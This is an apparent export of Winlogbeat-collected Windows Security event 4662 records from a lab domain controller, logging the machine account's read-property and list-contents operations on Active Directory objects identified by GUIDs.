				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109799	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"_BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109795	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"'-xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109794	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"'-hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109793	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"'-RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109792	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"'-BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109791	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"9xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109790	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"9hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109789	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.325"	"9RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109788	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.324"	"9BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109787	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.324"	"8xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109786	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:12.324"	"8hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.757"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D8FD

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0x63d8fd	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109785	"Directory Service Access"	" - "	" - "	" - "	" - "	-
